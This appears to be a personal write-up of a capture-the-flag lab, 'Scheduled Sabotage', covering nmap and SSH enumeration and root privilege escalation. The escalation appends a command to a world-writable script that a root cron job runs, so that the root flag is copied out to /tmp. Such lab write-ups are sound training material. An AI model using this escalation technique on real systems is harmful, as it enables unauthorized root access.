---
dg-publish: true
---

- Room Information
	- A backup server hums quietly, running its automated maintenance tasks on schedule. But are those scheduled tasks really secure? SSH in, enumerate the system like a real pentester, and discover how a simple misconfiguration can lead to complete system compromise. Time is ticking, the cron job runs every minute!

- Lab URL - https://hackerdna.com/labs/scheduled-sabotage
	

- 1) Nmap Enumeration
	- NMAP -sV (TARGET IP)
		- Results
			- PORT   STATE SERVICE VERSION
				- 22/tcp open  ssh     OpenSSH 10.2 (protocol 2.0)
				- 80/tcp open  http    nginx
- 2) Website Browse
	- ![[Scheduled Sabotage Image.png]]
- 3) SSH Enumeration
	- Readme.txt
		- You have been granted access to assess this backup server. The server runs an automated backup management system. Your objectives: 
			- Identify any sensitive information exposure
			- Find privilege escalation vulnerabilities
		- Known services:
			- Web interface on port 80
			- SSH on port 22
			- Backup manager installed in /opt/
- 4) User Flag
	- Browse to /opt/ folder as mentioned above
		- Located user flag while browsing through available folders in the directory
	
- 5) Next Steps
	- Check Cron Jobs
		- To do this run 'cat crontab' from /etc folder
	- Found cron job with full permissions granted
		* * * * * root /bin/sh /opt/backup-manager/scripts/system_check.sh >> /var/log/maintenance/system_check.log 2>&1
		
	- Permissions check using `ls -l /opt/backup-manager/scripts/system_check.sh`
		- -rwxrwxrwx /opt/backup-manager/scripts/system_check.sh - Full Permissions
- 6) Contents of script

``` Results
#!/bin/sh
# System Health Check Script
# Runs periodically to monitor system status

echo "[$(date)] Starting system check..."
df -h > /tmp/disk_status.txt 2>/dev/null
echo "[$(date)] Disk check complete."
echo "[$(date)] System check finished."
ip-10-0-10-176:/etc$
```

- 7) Modify cron job script
	- `echo "cp /root/flag-root.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt" >> /opt/backup-manager/scripts/system_check.sh`
		- `cp /root/flag-root.txt` - what file to copy
		- `/tmp/flag.txt` - where to copy file to
		- `chmod 644 /tmp/flag.txt` - sets file permissions to make it readable
		- `>> /opt/backup-manager/scripts/system_check.sh` - what script is being appended 
-
8) Wait for job to run and look for flag in /tmp/flag.txt